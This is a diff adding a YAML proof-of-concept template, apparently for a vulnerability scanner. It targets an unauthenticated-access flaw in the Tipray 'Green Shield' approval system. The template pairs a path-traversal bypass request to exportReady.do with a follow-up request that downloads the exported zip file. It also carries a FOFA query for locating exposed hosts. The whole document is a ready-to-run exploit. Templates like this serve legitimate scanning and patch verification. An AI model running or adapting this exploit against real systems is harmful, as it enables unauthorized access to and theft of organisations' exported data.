@@ -1,0 +1,22 @@
+id: poc-yaml-tipray-gsas-exportready-do-unauthorized-access
+info:
+  name: 天锐绿盾审批系统 exportReady.do 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 天锐绿盾审批系统
+  fofa: app="TIPPAY-绿盾审批系统"
+requests:
+- method: GET
+  path: /trwfe/login.jsp/.%2e/config/exportReady.do
+  expression: status_code == 200 && contains(headers,"Path=/trwfe") && contains(body,".zip")
+    && matches(body,"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}")
+    && !contains(body,"<")
+  output:
+  - regex_match(body,"(?P<uuid>[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})")
+  - regex_match(body,"export(?P<file>.*?).zip")
+- method: GET
+  path: /trwfe/{{.uuid}}/export{{.file}}.zip
+  expression: status_code == 200 && contains(content_type,"application/zip")
+variables: {}
+transport: http
